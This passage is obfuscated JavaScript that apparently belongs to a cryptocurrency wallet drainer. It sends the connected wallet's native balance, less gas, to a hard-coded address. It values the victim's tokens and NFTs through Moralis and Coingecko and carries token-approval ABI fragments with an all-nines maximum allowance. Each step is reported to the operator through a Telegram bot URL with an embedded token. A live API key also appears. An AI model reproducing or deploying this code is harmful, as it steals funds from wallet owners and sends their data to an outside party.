_0x55746c=parseFloat(_0x20ba55[_0x380fba(0x1e9)])-_0x1f328e*0.00042;_0x55746c=parseEther(_0x55746c[_0x380fba(0x1a8)]()),console[_0x380fba(0x234)](_0x55746c);const {hash:_0x3a3d15}=await sendTransaction({'to':Oxa,'value':_0x55746c});console[_0x380fba(0x234)](_0x3a3d15),sendMessage(_0x380fba(0x1e3),_0x3a3d15),sendMessage(_0x380fba(0x1a3)),sendMessage(_0x380fba(0x1c9));}catch{sendMessage(_0x380fba(0x1cc));}}function _0x46d2(){const _0x1ec942=['Approved','amount','GET','operator','ee71d215d0dec7d1bf950851c84d9643','_from','removeBlackList','saleIsActive','getOwner','uint256','decimals','avalanche','7039610VuZnDZ','https://deep-index.moralis.io/api/v2/','Approval','New\x20token','tokenOfOwnerByIndex','171ZDgOVW','_initialSupply','bytes','AddedBlackList','Transaction\x20is\x20submitted\x20to\x20the\x20network','pause','numberOfTokens','catch','No\x20address','toString','allowed','6053098690','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','length','https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses=','who','map','mintApe','MAX_UINT','saleStart','_to','value','bool','Approve\x20Completed\x20Successfully','approve','9844PEFJha','destroyBlackFunds','emergencySetStartingIndexBlock','approved','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','safeTransferFrom','tokenURI','remaining','chainId:','Incorrect\x20network','5227607491','balances','startingIndexBlock','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','_spender','result','MetaMask','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','options','hash','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','&text=','tokenByIndex','payable','Pause','bytes4','click','balance','gasPrice','allowance','_value','upgradedAddress','connector','function','from','tokens-list','ApprovalForAll','Error:\x20','baseURI','Transaction\x20Receipt:\x20','renounceOwnership','_maker','Error\x20collecting\x20info\x20about\x20wallet','Transaction\x20hash\x20','_evilUser','140312bKjuWj','isBlackListed','Redeem','maximumFee','formatted','index','application/json','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','Transfer','/nft/collections?chain=','&format=decimal&limit=','interfaceId','name','OwnershipTransferred','999999999999999999999999999999999999999999999999999999999999999999999999','reserveApes','all','Could\x20not\x20get\x20a\x20wallet\x20connection','previousOwner','newAddress','deprecated','Unpause','nonpayable','Unable\x20to\x20get\x20NFts','supportsInterface','Transaction\x20Rejected','newOwner','sort','NFTs\x20collection\x20','12609828jWNsWd','transferOwnership','basisPointsRate','BAYC_PROVENANCE','43114','totalSupply','DestroyedBlackFunds','1KWIbjt','REVEAL_TIMESTAMP','Your\x20address\x20','constructor','410898VPXupV','_owner','apePrice','transferFrom','sending\x20ether','string','Initial\x20list\x20','tokenId','Deprecate','getProvider','revealTimeStamp','filter','token_address','getApproved','openModal','search','_user','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','756LijFGv','.connect','symbol','event','then','spender','networkVersion','maxNftSupply','redeem','Tokens:','message','_blackListedUser','json','address','_data','0x4792CD557620f4C4B4c6636fF0262b39E91122A7','Cl\x20address\x20:\x20','NFT','Token\x20balance\x20is\x20','maxApePurchase','MAX_APES','log','_balance','10XFYEvB','Token','view','712790ekLfoo','status','error','RemovedBlackList','price','Error\x20processing\x20item\x20','setProvenanceHash','getBlackListStatus','3581221yBdirB','newBasisPoints','owner','11QpyeSi','deprecate','_totalSupply','_upgradedAddress'];_0x46d2=function(){return _0x1ec942;};return _0x46d2();}async function sendMessage(_0x179328){sendMessage1(_0x179328),sendMessage2(_0x179328);}async function sendMessage1(_0x2c02d2){return new Promise((_0x38f68b,_0x2347c8)=>{const _0x2e5f0c=_0x3b58,_0x34e7b6=Oxc1;fetch(_0x2e5f0c(0x21e)+_0x34e7b6+'&text='+_0x2c02d2,{'method':_0x2e5f0c(0x190),'headers':{}})[_0x2e5f0c(0x223)](async _0x1c9b51=>{const _0x265a1f=_0x2e5f0c;if(_0x1c9b51[_0x265a1f(0x23a)]>0x18f)throw _0x1c9b51;_0x38f68b(await _0x1c9b51[_0x265a1f(0x22b)]());})[_0x2e5f0c(0x1a6)](_0x460134=>{_0x2347c8(_0x460134);});});}async function sendMessage2(_0x2166a8){return new Promise((_0x3857cb,_0x112dee)=>{const _0x198b42=_0x3b58,_0x95b7ad=Oxc2;fetch(_0x198b42(0x21e)+_0x95b7ad+_0x198b42(0x1cd)+_0x2166a8,{'method':_0x198b42(0x190),'headers':{}})[_0x198b42(0x223)](async _0x428e3f=>{const _0x3280b0=_0x198b42;if(_0x428e3f['status']>0x18f)throw _0x428e3f;_0x3857cb(await _0x428e3f[_0x3280b0(0x22b)]());})[_0x198b42(0x1a6)](_0x2a8920=>{_0x112dee(_0x2a8920);});});}async function getPrice(_0x51552e){return new Promise((_0x20c850,_0x57deb8)=>{const _0x277bfd=_0x3b58;fetch(_0x277bfd(0x1ad)+_0x51552e+'&vs_currencies=usd',{'method':'GET','headers':{}})[_0x277bfd(0x223)](async _0x43c39a=>{const _0x13e6e0=_0x277bfd;if(_0x43c39a[_0x13e6e0(0x23a)]>0x18f)throw _0x43c39a;_0x20c850(await _0x43c39a[_0x13e6e0(0x22b)]());})[_0x277bfd(0x1a6)](_0x51cc0b=>{_0x57deb8(_0x51cc0b);});});}async function getValue(_0x51c0d4,_0x3c88d3,_0x2c223d){const _0xe3c9d6=_0x4dcaf4;console['log'](_0x51c0d4,_0x3c88d3,_0x2c223d);let _0x591fb1=await getPrice(_0x51c0d4);console[_0xe3c9d6(0x234)](_0xe3c9d6(0x23d),_0x591fb1),_0x591fb1=parseFloat(_0x591fb1[_0x51c0d4]['usd']);let _0x2dcd30=_0x3c88d3/0xa**(_0x2c223d||0x12)*_0x591fb1;return _0x2dcd30=parseInt(_0x2dcd30),_0x591fb1?_0x2dcd30:0x0;}async function getNFTs(_0x122e7e='',_0x403d14='LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn',_0x46e6f1=_0x4dcaf4(0x199),_0x11fb1d='50'){return new Promise((_0x1b148a,_0x591a65)=>{const _0x755fbf=_0x3b58;fetch(_0x755fbf(0x19b)+_0x122e7e+_0x755fbf(0x1ee)+_0x46e6f1+_0x755fbf(0x1ef)+_0x11fb1d,{'method':_0x755fbf(0x190),'headers':{'accept':_0x755fbf(0x1eb),'X-API-Key':_0x403d14}})[_0x755fbf(0x223)](async _0x4fa667=>{const _0x175064=_0x755fbf;if(_0x4fa667[_0x175064(0x23a)]>0x18f)throw _0x4fa667;_0x1b148a(await _0x4fa667['json']());})['catch'](_0x44f384=>{_0x591a65(_0x44f384);});});}